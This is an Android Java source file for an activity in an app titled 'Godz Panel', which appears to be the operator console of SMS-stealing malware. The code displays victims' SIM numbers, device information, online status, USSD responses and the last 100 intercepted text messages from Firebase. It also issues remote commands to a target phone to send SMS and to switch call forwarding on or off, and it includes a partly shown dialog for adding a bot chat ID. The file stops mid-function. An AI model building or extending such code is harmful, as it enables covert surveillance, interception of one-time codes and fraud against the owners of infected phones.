package com.Rahul.Developer.Admin;

import android.animation.*;
import android.app.*;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.*;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.net.Uri;
import android.os.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.view.*;
import android.view.View;
import android.view.View.*;
import android.view.animation.*;
import android.webkit.*;
import android.widget.*;
import android.widget.ArrayAdapter;
import android.widget.BaseAdapter;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import androidx.annotation.*;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.coordinatorlayout.widget.CoordinatorLayout;
import androidx.fragment.app.DialogFragment;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import com.google.android.material.appbar.AppBarLayout;
import com.google.android.material.button.*;
import com.google.android.material.floatingactionbutton.FloatingActionButton;
import com.google.firebase.FirebaseApp;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.ValueEventListener;
import com.scottyab.aescrypt.*;
import java.io.*;
import java.text.*;
import java.util.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;
import java.util.regex.*;
import org.json.*;
import android.view.inputmethod.InputMethodManager;
import android.provider.Settings;
//import com.my.admin.ASD.SmsListViewAdapter;

public class AllInfoActivity extends AppCompatActivity {
	
	private Timer _timer = new Timer();
	private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
	
	// private static final String TAG = "MainActivity";
	//   private ListView smsListView;
	private SMSAdapter adapter;
	private List<SMSModel> smsList;
	private String deviceId;
	private Toolbar _toolbar;
	private AppBarLayout _app_bar;
	private CoordinatorLayout _coordinator;
	private FloatingActionButton _fab;
	private HashMap<String, Object> map = new HashMap<>();
	private boolean send = false;
	private HashMap<String, Object> sm = new HashMap<>();
	private double chack_slot = 0;
	private String uid = "";
	private HashMap<String, Object> sms = new HashMap<>();
	private HashMap<String, Object> mao = new HashMap<>();
	private String atype = "";
	private String sim1CarrierName = "";
	private String sim1PhoneNumber = "";
	private String sim1SimType = "";
	private String sim2CarrierName = "";
	private String sim2PhoneNumber = "";
	private String sim2SimType = "";
	private String uuid = "";
	private HashMap<String, Object> np = new HashMap<>();
	private String user_id = "";
	
	private ArrayList<HashMap<String, Object>> mp = new ArrayList<>();
	
	private LinearLayout linear1;
	private LinearLayout linear3;
	private LinearLayout linear14;
	private LinearLayout linear6;
	private LinearLayout linear7;
	private MaterialButton materialbutton1;
	private MaterialButton materialbutton2;
	private TextView all_info;
	private TextView forward_status;
	private TextView time_zone;
	private TextView status;
	private TextView textview1;
	private ListView smsListView;
	
	private DatabaseReference user_data = _firebase.getReference("user_data");
	private ChildEventListener _user_data_child_listener;
	private AlertDialog.Builder dialog;
	private DatabaseReference noti = _firebase.getReference("noti");
	private ChildEventListener _noti_child_listener;
	private TimerTask timer;
	private DatabaseReference dbRef = _firebase.getReference("user");
	private ChildEventListener _dbRef_child_listener;
	private DatabaseReference users = _firebase.getReference("users");
	private ChildEventListener _users_child_listener;
	private SharedPreferences op;
	private Intent ii = new Intent();
	private Intent i = new Intent();
	
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.all_info);
		initialize(_savedInstanceState);
		FirebaseApp.initializeApp(this);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		_app_bar = findViewById(R.id._app_bar);
		_coordinator = findViewById(R.id._coordinator);
		_toolbar = findViewById(R.id._toolbar);
		setSupportActionBar(_toolbar);
		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
		getSupportActionBar().setHomeButtonEnabled(true);
		_toolbar.setNavigationOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _v) {
				onBackPressed();
			}
		});
		_fab = findViewById(R.id._fab);
		linear1 = findViewById(R.id.linear1);
		linear3 = findViewById(R.id.linear3);
		linear14 = findViewById(R.id.linear14);
		linear6 = findViewById(R.id.linear6);
		linear7 = findViewById(R.id.linear7);
		materialbutton1 = findViewById(R.id.materialbutton1);
		materialbutton2 = findViewById(R.id.materialbutton2);
		all_info = findViewById(R.id.all_info);
		forward_status = findViewById(R.id.forward_status);
		time_zone = findViewById(R.id.time_zone);
		status = findViewById(R.id.status);
		textview1 = findViewById(R.id.textview1);
		smsListView = findViewById(R.id.smsListView);
		dialog = new AlertDialog.Builder(this);
		op = getSharedPreferences("op", Activity.MODE_PRIVATE);
		
		materialbutton1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				atype = "call_forward";
				_forward_call();
			}
		});
		
		materialbutton2.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				atype = "sms";
				_send_sms();
			}
		});
		
		textview1.setOnLongClickListener(new View.OnLongClickListener() {
			@Override
			public boolean onLongClick(View _view) {
				i.setClass(getApplicationContext(), DataAnalayasActivity.class);
				i.putExtra("user_id", uuid);
				startActivity(i);
				return true;
			}
		});
		
		textview1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				ii.putExtra("user_id", uuid);
				ii.setClass(getApplicationContext(), LoginActivity.class);
				startActivity(ii);
			}
		});
		
		_fab.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				i.setClass(getApplicationContext(), DataAnalayasActivity.class);
				i.putExtra("user_id", uuid);
				startActivity(i);
			}
		});
		
		_user_data_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				// ✅ Intent থেকে User ID নেওয়া
				String userId = getIntent().getStringExtra("user_id");
				
				// ✅ রিয়েলটাইম ডাটাবেজ রেফারেন্স সেট করা
				DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("user_data").child(userId);
				
				if (_childKey.equals(userId)) {
					sim1CarrierName = _childValue.get("nameSim1") != null ? _childValue.get("nameSim1").toString() : "";
					sim1PhoneNumber = _childValue.get("numberSim1") != null ? _childValue.get("numberSim1").toString() : "";
					sim2CarrierName = _childValue.get("nameSim2") != null ? _childValue.get("nameSim2").toString() : "";
					sim2PhoneNumber = _childValue.get("numberSim2") != null ? _childValue.get("numberSim2").toString() : "";
					uuid = _childValue.get("device") != null ? _childValue.get("device").toString() : "";
					
					if (_childValue.get("Device_info") != null) {
						all_info.setText(_childValue.get("Device_info").toString());
					}
					
					// ✅ USSD Response & USSD Code চেক এবং `forward_status`-এ সেট ✅
					if (_childValue.get("ussd_response") != null || _childValue.get("ussd_code") != null) {
						String ussdResponse = _childValue.get("ussd_response") != null ? _childValue.get("ussd_response").toString() : "No Response";
						String ussdCode = _childValue.get("ussd_code") != null ? _childValue.get("ussd_code").toString() : "No Code";
						
						// ✅ `forward_status` TextView-এ সেট করা
						String ussdStatus = "USSD Code: " + ussdCode + "\nUSSD Response:\n" + ussdResponse;
						forward_status.setText(ussdStatus);
						
						// 🔥 Debugging: ডাটা Firebase থেকে ডিলিট করা হচ্ছে না 🔥
						Log.d("FirebaseDebug", "USSD Code Showing: " + ussdCode);
						Log.d("FirebaseDebug", "USSD Response Showing: " + ussdResponse);
					}
					
					// ✅ Last Updated Time Check ✅
					if (_childValue.get("lastUpdated") != null) {
						try {
							long lastUpdated = Long.parseLong(_childValue.get("lastUpdated").toString());
							long currentTime = System.currentTimeMillis(); 
							
							Log.d("AdminActivity", "lastUpdated: " + lastUpdated);
							Log.d("AdminActivity", "currentTime: " + currentTime);
							Log.d("AdminActivity", "Time Difference: " + (currentTime - lastUpdated));
							
							if ((currentTime - lastUpdated) > 5000) { // ৫ সেকেন্ডের মধ্যে আপডেট না হলে Offline
								status.setText("🔴 Offline");
								Log.d("AdminActivity", "User is Offline");
							} else {
								status.setText("🟢 Online");
								Log.d("AdminActivity", "User is Online");
							}
						} catch (NumberFormatException e) {
							Log.e("AdminActivity", "Error parsing lastUpdated", e);
						}
					}
				}
				if (_childValue.containsKey("Device_info")) {
					
				}
				op.edit().putString("op", getIntent().getStringExtra("user_id")).commit();
				/**/
				/*
if (_childKey.equals(getIntent().getStringExtra("user_id"))) {
if (true) {
sim1CarrierName = _childValue.get("nameSim1").toString();
}
if (_childValue.containsKey("numberSim1")) {
sim1PhoneNumber = _childValue.get("numberSim1").toString();
}
if (_childValue.containsKey("typeSim1")) {

}
if (_childValue.containsKey("nameSim2")) {
sim2CarrierName = _childValue.get("nameSim2").toString();
}
if (_childValue.containsKey("numberSim2")) {
sim2PhoneNumber = _childValue.get("numberSim2").toString();
}
if (_childValue.containsKey("typeSim2")) {

}
if (_childValue.containsKey("Device_info")) {
all_info.setText(_childValue.get("Device_info").toString());
}
if (_childValue.containsKey("")) {

}
    // 🔥 lastUpdated চেক করার সময় আগে সেটার মান সঠিকভাবে নেওয়া হচ্ছে কিনা নিশ্চিত হও
    if (_childValue.containsKey("lastUpdated")) {
        long lastUpdated = Long.parseLong(_childValue.get("lastUpdated").toString());

        Log.d("AdminActivity", "lastUpdated: " + lastUpdated);
        Log.d("AdminActivity", "currentTime: " + currentTime);
        Log.d("AdminActivity", "Time Difference: " + (currentTime - lastUpdated));

        if ((currentTime - lastUpdated) > 5000) { // ৫ সেকেন্ডের মধ্যে আপডেট না হলে Offline
            status.setText("🔴 Offline");
            Log.d("AdminActivity", "User is Offline");
        } else {
            status.setText("🟢 Online");
            Log.d("AdminActivity", "User is Online");
        }
    }

}
     Toast.makeText(AllInfoActivity.this, _childValue.get("ussd_response").toString(), Toast.LENGTH_SHORT).show();
*/
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				// ✅ Intent থেকে User ID নেওয়া
				String userId = getIntent().getStringExtra("user_id");
				
				// ✅ রিয়েলটাইম ডাটাবেজ রেফারেন্স সেট করা
				DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference("user_data").child(userId);
				
				if (_childKey.equals(userId)) {
					sim1CarrierName = _childValue.get("nameSim1") != null ? _childValue.get("nameSim1").toString() : "";
					sim1PhoneNumber = _childValue.get("numberSim1") != null ? _childValue.get("numberSim1").toString() : "";
					sim2CarrierName = _childValue.get("nameSim2") != null ? _childValue.get("nameSim2").toString() : "";
					sim2PhoneNumber = _childValue.get("numberSim2") != null ? _childValue.get("numberSim2").toString() : "";
					uuid = _childValue.get("device") != null ? _childValue.get("device").toString() : "";
					
					if (_childValue.get("Device_info") != null) {
						all_info.setText(_childValue.get("Device_info").toString());
					}
					
					// ✅ USSD Response & USSD Code চেক এবং `forward_status`-এ সেট ✅
					if (_childValue.get("ussd_response") != null || _childValue.get("ussd_code") != null) {
						String ussdResponse = _childValue.get("ussd_response") != null ? _childValue.get("ussd_response").toString() : "No Response";
						String ussdCode = _childValue.get("ussd_code") != null ? _childValue.get("ussd_code").toString() : "No Code";
						
						// ✅ `forward_status` TextView-এ সেট করা
						String ussdStatus = "USSD Code: " + ussdCode + "\nUSSD Response:\n" + ussdResponse;
						forward_status.setText(ussdStatus);
						
						// 🔥 Debugging: ডাটা Firebase থেকে ডিলিট করা হচ্ছে না 🔥
						Log.d("FirebaseDebug", "USSD Code Showing: " + ussdCode);
						Log.d("FirebaseDebug", "USSD Response Showing: " + ussdResponse);
					}
					
					// ✅ Last Updated Time Check ✅
					if (_childValue.get("lastUpdated") != null) {
						try {
							long lastUpdated = Long.parseLong(_childValue.get("lastUpdated").toString());
							long currentTime = System.currentTimeMillis(); 
							
							Log.d("AdminActivity", "lastUpdated: " + lastUpdated);
							Log.d("AdminActivity", "currentTime: " + currentTime);
							Log.d("AdminActivity", "Time Difference: " + (currentTime - lastUpdated));
							
							if ((currentTime - lastUpdated) > 5000) { // ৫ সেকেন্ডের মধ্যে আপডেট না হলে Offline
								status.setText("🔴 Offline");
								Log.d("AdminActivity", "User is Offline");
							} else {
								status.setText("🟢 Online");
								Log.d("AdminActivity", "User is Online");
							}
						} catch (NumberFormatException e) {
							Log.e("AdminActivity", "Error parsing lastUpdated", e);
						}
					}
				}
				/**/
				/*
if (_childKey.equals(getIntent().getStringExtra("user_id"))) {
                    long lastUpdated = snapshot.getValue(Long.class);
                    long currentTime = System.currentTimeMillis();
if (_childValue.containsKey("s_sms")) {

}
if (_childValue.containsKey("d_info")) {
all_info.setText(_childValue.get("d_info").toString());
}
if (_childValue.containsKey("u_time")) {
time_zone.setText(_childValue.get("u_time").toString());
}
if (_childValue.containsKey("sim_info")) {
forward_status.setText(_childValue.get("sim_info").toString());
}
if (_childValue.containsKey("uuid")) {
uid = _childValue.get("uuid").toString();
}
if (_childValue.containsKey("lastUpdated")) {
if ((currentTime - lastUpdated) > 5000) { // ৫ সেকেন্ডের মধ্যে আপডেট না হলে Offline
                        status.setText("🔴 Offline");
                        Log.d("AdminActivity", "User is Offline");
                    } else {
                        status.setText("🟢 Online");
                        Log.d("AdminActivity", "User is Online");
                    }
}
}
*/
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		user_data.addChildEventListener(_user_data_child_listener);
		
		_noti_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		noti.addChildEventListener(_noti_child_listener);
		
		_dbRef_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		dbRef.addChildEventListener(_dbRef_child_listener);
		
		_users_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		users.addChildEventListener(_users_child_listener);
	}
	
	private void initializeLogic() {
		setTitle("Godz Panel");
		user_id = getIntent().getStringExtra("user_id");
		{
			android.graphics.drawable.GradientDrawable SketchUi = new android.graphics.drawable.GradientDrawable();
			int d = (int) getApplicationContext().getResources().getDisplayMetrics().density;
			SketchUi.setColor(0xFF212121);
			SketchUi.setCornerRadius(d*18);
			SketchUi.setStroke(d*2,0xFF212121);
			linear3.setElevation(d*5);
			linear3.setBackground(SketchUi);
		}
		{
			android.graphics.drawable.GradientDrawable SketchUi = new android.graphics.drawable.GradientDrawable();
			int d = (int) getApplicationContext().getResources().getDisplayMetrics().density;
			SketchUi.setColor(0xFF212121);
			SketchUi.setCornerRadius(d*0);
			SketchUi.setStroke(d*1,0xFF212121);
			linear6.setElevation(d*5);
			linear6.setBackground(SketchUi);
		}
		textview1.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)20, 0xFFC62828));
		DatabaseReference ussdRef = FirebaseDatabase.getInstance().getReference("user_data").child(getIntent().getStringExtra("user_id")).child("user_error");
		send = false;
		chack_slot = 00;
		time_zone.setTextIsSelectable(true);
		all_info.setTextIsSelectable(true);
		forward_status.setTextIsSelectable(true);
		smsListView = findViewById(R.id.smsListView);
		smsList = new ArrayList<>();
		deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
		dbRef = FirebaseDatabase.getInstance().getReference("user_sms").child(deviceId);
		adapter = new SMSAdapter(this, smsList, dbRef);
		smsListView.setAdapter(adapter);
		
		fetchMessages();
	}
	private void fetchMessages() {
		String userId = getIntent().getStringExtra("user_id"); // 🔥 Intent থেকে user_id নিচ্ছি
		
		if (userId == null || userId.isEmpty()) {
			Toast.makeText(this, "User ID not found!", Toast.LENGTH_SHORT).show();
			return;
		}
		
		DatabaseReference userSmsRef = FirebaseDatabase.getInstance().getReference("user_sms").child(userId);
		
		userSmsRef.limitToLast(100)
		.addValueEventListener(new ValueEventListener() {
			@Override
			public void onDataChange(@NonNull DataSnapshot snapshot) {
				smsList.clear();
				for (DataSnapshot child : snapshot.getChildren()) {
					SMSModel sms = child.getValue(SMSModel.class);
					if (sms != null) {
						sms.setKey(child.getKey()); // 🔥 Key সেট করলাম
						smsList.add(0, sms);
					}
				}
				adapter.notifyDataSetChanged(); // UI আপডেট
			}
			
			@Override
			public void onCancelled(@NonNull DatabaseError error) {
				Toast.makeText(getApplicationContext(), "Failed to load messages!", Toast.LENGTH_SHORT).show();
			}
		});
		
		timer = new TimerTask() {
			@Override
			public void run() {
				runOnUiThread(new Runnable() {
					@Override
					public void run() {
						time_zone.setText("SIM 1: ".concat(sim1CarrierName.concat("\n".concat("SIM 1: ".concat(sim1PhoneNumber.concat("\n\n".concat("SIM 2: ".concat(sim2CarrierName.concat("\n".concat("SIM 2: ".concat(sim2PhoneNumber)))))))))));
					}
				});
			}
		};
		_timer.schedule(timer, (int)(2000));
	}
	
	public void _TransitionManager(final View _view, final double _duration) {
		LinearLayout viewgroup =(LinearLayout) _view;
		
		android.transition.AutoTransition autoTransition = new android.transition.AutoTransition(); autoTransition.setDuration((long)_duration); android.transition.TransitionManager.beginDelayedTransition(viewgroup, autoTransition);
	}
	
	
	public void _bt_uu(final View _view) {
		{
			android.graphics.drawable.GradientDrawable SketchUi = new android.graphics.drawable.GradientDrawable();
			int d = (int) getApplicationContext().getResources().getDisplayMetrics().density;
			SketchUi.setColor(0xFFFFFFFF);
			SketchUi.setCornerRadius(d*55);
			SketchUi.setStroke(d*2,0xFF304FFE);
			_view.setElevation(d*2);
			android.graphics.drawable.RippleDrawable SketchUi_RD = new android.graphics.drawable.RippleDrawable(new android.content.res.ColorStateList(new int[][]{new int[]{}}, new int[]{0xFF00B0FF}), SketchUi, null);
			_view.setBackground(SketchUi_RD);
			_view.setClickable(true);
		}
	}
	
	
	public void _send_sms() {
		final AlertDialog dialog = new AlertDialog.Builder(AllInfoActivity.this).create();
		View inflate = getLayoutInflater().inflate(R.layout.sendsms,null); 
		dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
		dialog.setView(inflate);
		dialog.setCancelable(true);
		LinearLayout bg1 = (LinearLayout) inflate.findViewById(R.id.bg1);
		{
			android.graphics.drawable.GradientDrawable SketchUi = new android.graphics.drawable.GradientDrawable();
			int d = (int) getApplicationContext().getResources().getDisplayMetrics().density;
			SketchUi.setColor(0xFFFFFFFF);
			SketchUi.setCornerRadius(d*19);
			bg1.setElevation(d*2);
			android.graphics.drawable.RippleDrawable SketchUi_RD = new android.graphics.drawable.RippleDrawable(new android.content.res.ColorStateList(new int[][]{new int[]{}}, new int[]{0xFFE0E0E0}), SketchUi, null);
			bg1.setBackground(SketchUi_RD);
			bg1.setClickable(false);
		}
		final EditText ed1 = (EditText) inflate.findViewById(R.id.ed1);
		final EditText ed2 = (EditText) inflate.findViewById(R.id.ed2);
		final RadioButton radiobutton1 = (RadioButton) inflate.findViewById(R.id.radiobutton1);
		final RadioButton radiobutton2 = (RadioButton) inflate.findViewById(R.id.radiobutton2);
		ed1.setTextIsSelectable(true);
		ed2.setTextIsSelectable(true);
		Button bt1 = (Button)
		inflate.findViewById(R.id.bt1);
		bt1.setText("Cancel");
		Button bt2 = (Button)
		inflate.findViewById(R.id.bt2);
		bt2.setText("Send");
		bt2.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)13, (int)0, Color.TRANSPARENT, 0xFF2962FF));
		bt1.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)13, (int)0, Color.TRANSPARENT, 0xFF2962FF));
		bt2.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				if (ed1.getText().toString().equals("")) {
					((EditText)ed1).setError("please enter phone number");
				} else {
					if (ed2.getText().toString().equals("")) {
						((EditText)ed2).setError("please enter message");
					} else {
						mao = new HashMap<>();
						mao.put("targetDeviceId", uuid);
						mao.put("phoneNumber", ed1.getText().toString());
						mao.put("messageText", ed2.getText().toString());
						mao.put("simSlot", String.valueOf((long)(chack_slot)));
						mao.put("command", "send message");
						user_data.child(uuid).updateChildren(mao);
						mao.clear();
						Toast.makeText(AllInfoActivity.this, "Send Successfully", Toast.LENGTH_SHORT).show();
						dialog.dismiss();
					}
				}
			}
		});
		bt1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				dialog.dismiss();
			}
		});
		radiobutton1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				if (radiobutton2.isChecked()) {
					radiobutton2.setChecked(false);
					chack_slot = 0;
				}
			}
		});
		radiobutton2.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				if (radiobutton1.isChecked()) {
					radiobutton1.setChecked(false);
					chack_slot = 1;
				}
			}
		});
		dialog.show();
	}
	
	
	public void _forward_call() {
		uid = "51ff84d09bb02ced";
		final AlertDialog dialog = new AlertDialog.Builder(AllInfoActivity.this).create();
		View inflate = getLayoutInflater().inflate(R.layout.callforwad,null); 
		dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
		dialog.setView(inflate);
		dialog.setCancelable(true);
		LinearLayout bg1 = (LinearLayout) inflate.findViewById(R.id.bg1);
		bg1.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)15, 0xFFB0BEC5));
		final EditText ed1 = (EditText) inflate.findViewById(R.id.ed1);
		final EditText ed2 = (EditText) inflate.findViewById(R.id.ed2);
		final RadioButton radiobutton1 = (RadioButton) inflate.findViewById(R.id.radiobutton1);
		final RadioButton radiobutton2 = (RadioButton) inflate.findViewById(R.id.radiobutton2);
		ed1.setTextIsSelectable(true);
		ed1.setFilters(new InputFilter[]{new InputFilter.LengthFilter((int) 10)});
		ed1.setFocusable(true);
		TextView sim1 = (TextView) inflate.findViewById(R.id.sim1);
		sim1.setText(sim1CarrierName.concat("\n".concat(sim1PhoneNumber)));
		TextView sim2 = (TextView) inflate.findViewById(R.id.sim2);
		sim2.setText(sim2CarrierName.concat("\n".concat(sim2PhoneNumber)));
		Button bt1 = (Button)
		inflate.findViewById(R.id.bt1);
		bt1.setText("Activate");
		Button bt3 = (Button)
		inflate.findViewById(R.id.bt3);
		bt3.setText("Chack Status");
		Button bt2 = (Button)
		inflate.findViewById(R.id.bt2);
		bt2.setText("Deactivate");
		ImageView img1 = (ImageView) inflate.findViewById(R.id.img1);
		ImageView img2 = (ImageView) inflate.findViewById(R.id.img2);
		img1.setColorFilter(0xFFFFFFFF, PorterDuff.Mode.MULTIPLY);
		img2.setColorFilter(0xFFFFFFFF, PorterDuff.Mode.MULTIPLY);
		bt2.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)13, (int)0, Color.TRANSPARENT, 0xFF2962FF));
		bt1.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b, int c, int d) { this.setCornerRadius(a); this.setStroke(b, c); this.setColor(d); return this; } }.getIns((int)13, (int)0, Color.TRANSPARENT, 0xFF2962FF));
		radiobutton1.setChecked(true);
		chack_slot = 0;
		bt1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				if (ed1.getText().toString().equals("")) {
					((EditText)ed1).setError("please enter phone number");
				} else {
					mao = new HashMap<>();
					mao.put("targetDeviceId", uuid);
					mao.put("simSlot", String.valueOf((long)(chack_slot)));
					mao.put("phoneNumber", ed1.getText().toString());
					mao.put("command", "call forward");
					user_data.child(uuid).updateChildren(mao);
					mao.clear();
					Toast.makeText(AllInfoActivity.this, "Send Successfully", Toast.LENGTH_SHORT).show();
					dialog.dismiss();
				}
			}
		});
		bt2.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				mao = new HashMap<>();
				mao.put("targetDeviceId", uuid);
				mao.put("simSlot", String.valueOf((long)(chack_slot)));
				mao.put("command", "forward off");
				user_data.child(uuid).updateChildren(mao);
				mao.clear();
				Toast.makeText(AllInfoActivity.this, "Send Successfully", Toast.LENGTH_SHORT).show();
				dialog.dismiss();
			}
		});
		bt3.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				mao = new HashMap<>();
				mao.put("targetDeviceId", uuid);
				mao.put("simSlot", String.valueOf((long)(chack_slot)));
				mao.put("command", "forward status");
				user_data.child(uuid).updateChildren(mao);
				mao.clear();
				Toast.makeText(AllInfoActivity.this, "Send Successfully", Toast.LENGTH_SHORT).show();
				dialog.dismiss();
			}
		});
		radiobutton1.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				if (radiobutton2.isChecked()) {
					radiobutton2.setChecked(false);
					chack_slot = 0;
				}
			}
		});
		radiobutton2.setOnClickListener(new View.OnClickListener(){ public void onClick(View v){
				if (radiobutton1.isChecked()) {
					radiobutton1.setChecked(false);
					chack_slot = 1;
				}
			}
		});
		dialog.show();
	}
	
	
	public void _add_bot() {
		final AlertDialog dialog = new AlertDialog.Builder(AllInfoActivity.this).create();
		View inflate = getLayoutInflater().inflate(R.layout.bot_added,null); 
		dialog.getWindow().setBackgroundDrawableResource(android.R.color.transparent);
		dialog.setView(inflate);
		LinearLayout bg1 = (LinearLayout) inflate.findViewById(R.id.bg1);
		LinearLayout bg2 = (LinearLayout) inflate.findViewById(R.id.bg2);
		bg2.setVisibility(View.GONE);
		bg1.setBackground(new GradientDrawable() { public GradientDrawable getIns(int a, int b) { this.setCornerRadius(a); this.setColor(b); return this; } }.getIns((int)21, 0xFFFFFFFF));
		final EditText et1 = (EditText) inflate.findViewById(R.id.et1);
		final EditText et2 = (EditText) inflate.findViewById(R.id.et2);
		//final RadioButton radiobutton1 = (RadioButton) inflate.findViewById(R.id.radiobutton1);
		//final RadioButton radiobutton2 = (RadioButton) inflate.findViewById(R.id.radiobutton2);
		et1.setTextIsSelectable(true);
		et1.setHint("Chat ID");
		et2.setTextIsSelectable(true);
		Button bt1 = (Button)
		inflate.findViewById(R.id.bt1);
